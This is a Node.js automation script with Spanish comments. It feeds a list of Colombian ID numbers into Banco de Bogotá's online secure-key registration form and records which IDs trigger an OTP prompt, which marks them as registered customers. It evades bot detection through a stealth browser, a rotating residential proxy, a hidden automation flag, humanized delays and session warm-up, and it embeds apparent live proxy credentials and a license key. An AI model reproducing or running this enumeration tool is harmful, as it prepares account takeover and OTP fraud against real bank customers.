const { launchPersistentContext } = require('cloakbrowser');
const fs = require('fs');
const path = require('path');

// ============================================================
// CONFIGURACIÓN
// ============================================================
const URL_FORMULARIO = 'https://virtual.bancodebogota.co/clave-segura/registro/validacion-cliente'; 
const ARCHIVO_CEDULAS = 'cedulas.txt';
const ARCHIVO_OTP = 'pendientes_otp.txt';

const CARPETA_PERFIL = path.join(__dirname, 'perfil_cloak_real');

// 🌟 TU CLAVE DE LICENCIA
const LICENSE_KEY = 'cb_debb6498264241f695c276fdb89df568';

// Proxy (Asegúrate de que el puerto 9000 sea el residencial/rotativo)
const PROXY_URL = 'http://geonode_PKlL1yvoTG:605d224e-19b6-4baa-8107-296ee7d836f5@92.204.171.83:9000';

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

function leerCedulas() {
  try {
    return fs.readFileSync(ARCHIVO_CEDULAS, 'utf8').split(/\r?\n/).map(l => l.trim()).filter(Boolean);
  } catch (e) { return []; }
}

function guardarOTP(cedula) {
  fs.appendFileSync(ARCHIVO_OTP, `${cedula}\t${new Date().toISOString()}\n`, 'utf8');
  console.log(`   📝 OTP guardado en archivo: ${cedula}`);
}

// ============================================================
// FLUJO PRINCIPAL
// ============================================================
(async () => {
  const cedulas = leerCedulas();
  if (cedulas.length === 0) return console.log('❌ No hay cédulas');
  if (!fs.existsSync(ARCHIVO_OTP)) fs.writeFileSync(ARCHIVO_OTP, '', 'utf8');

  const esPerfilNuevo = !fs.existsSync(CARPETA_PERFIL);
  if (esPerfilNuevo) {
      console.log('   🔥 PERFIL NUEVO. Se abrirá Google para calentar la sesión.');
  }

  let context = null;
  try {
    if (!fs.existsSync(CARPETA_PERFIL)) {
        fs.mkdirSync(CARPETA_PERFIL, { recursive: true });
    }

    console.log(`   🛡️ Iniciando CloakBrowser Pro...`);
    context = await launchPersistentContext({
        userDataDir: CARPETA_PERFIL,
        license_key: LICENSE_KEY, // 🌟 Tu clave integrada
        headless: false, 
        humanize: true,  
        human_preset: 'careful', 
        proxy: PROXY_URL,
        geoip: true, 
        args: [
            '--start-maximized',
            // 🌟 Flags recomendados por la documentación de CloakBrowser para proxies difíciles
            '--fingerprint-transparent-proxy',
            '--license-route=proxy', // Valida la licencia a través del proxy para no usar tu IP real
            '--disable-blink-features=AutomationControlled'
        ]
    });
    
    const page = context.pages()[0] || await context.newPage();

    // 🌟 CALENTAMIENTO
    if (esPerfilNuevo) {
        await page.goto('https://www.google.com', { waitUntil: 'networkidle' });
        console.log('   ⏳ Navega un poco en Google durante 20 segundos (haz búsquedas, clics)...');
        await sleep(20000); 
    }

    // PROCESAMIENTO
    for (let i = 0; i < cedulas.length; i++) {
      const cedula = cedulas[i];
      console.log(`\n[${i + 1}/${cedulas.length}] Cédula: ${cedula}`);

      try {
        console.log(`   🔄 Navegando al formulario...`);
        await page.goto(URL_FORMULARIO, { waitUntil: 'networkidle', timeout: 60000 });
        await sleep(8000 + Math.floor(Math.random() * 3000)); 

        console.log('   🖱️  Haciendo clic en el input...');
        const selectorInput = '.S4rA9R8LnfmmUe06aTrJTg\\=\\= > div';
        await page.waitForSelector(selectorInput, { timeout: 15000 });
        
        await page.click(selectorInput);
        await sleep(1500);

        console.log('   ⌨️  Escribiendo la cédula...');
        await page.type(selectorInput, cedula, { delay: 150 }); 
        await sleep(2500);

        console.log('   🖱️  Clic en Verificar...');
        const btnSelector = 'button[data-testid="verify-button"]';
        await page.waitForSelector(btnSelector);
        await page.click(btnSelector);

        console.log('   ⏳ Analizando respuesta...');
        let resultado = 'desconocido';
        const urlInicial = page.url();

        for (let t = 0; t < 15; t++) {
          await sleep(1000);
          
          resultado = await page.evaluate((urlInicial) => {
            const bodyText = document.body.innerText.toLowerCase();

            if (bodyText.includes('no es posible realizar la operación') || bodyText.includes('en este momento no es posible')) {
               return 'bloqueo_banco';
            }

            const modal = document.querySelector('[data-testid="notification-modal"]');
            if (modal) {
               const rect = modal.getBoundingClientRect();
               if (rect.width > 0 && rect.height > 0 && window.getComputedStyle(modal).display !== 'none') {
                   if (bodyText.includes('tus datos no coinciden')) return 'no_coincide';
               }
            }
            
            const inputOtp = document.querySelector('input[name*="otp" i], input[placeholder*="código" i], input[id*="otp" i]');
            if (inputOtp) {
                const rect = inputOtp.getBoundingClientRect();
                if (rect.width > 0 && rect.height > 0) return 'otp';
            }

            const urlActual = window.location.href;
            if (urlActual !== urlInicial && (urlActual.includes('clave-segura') || bodyText.includes('clave segura'))) {
                return 'otp';
            }

            const regexOtp = /(c[oó]digo de verificaci[oó]n|ingresa el c[oó]digo|te enviamos un c[oó]digo|digita el c[oó]digo|sms|token|pin de seguridad)/i;
            if (regexOtp.test(bodyText)) return 'otp';

            return 'esperando';
          }, urlInicial);

          if (resultado !== 'esperando') break;
        }

        if (resultado === 'otp') {
          console.log('   🔐 ¡Pide OTP / Clave Segura detectada!');
          guardarOTP(cedula);
        } else if (resultado === 'no_coincide') {
          console.log('   ⚠️  Cédula no existe (Tus datos no coinciden)');
        } else if (resultado === 'bloqueo_banco') {
          console.log('   🚫 Bloqueo persistente.');
        } else {
          console.log('   ❓ No identificado.');
        }

      } catch (err) {
        console.error(`   ❌ Error en cédula: ${err.message}`);
      }
      
      console.log('   ⏳ Pasando a la siguiente cédula...');
      await sleep(10000 + Math.floor(Math.random() * 5000)); 
    }

  } catch (globalErr) {
      console.error('❌ Error crítico:', globalErr);
  } finally {
      if (context) {
          await context.close();
          console.log('   🔒 Navegador cerrado limpiamente (sesión liberada).');
      }
  }
  
  console.log('\n✅ PROCESO TERMINADO.');
})();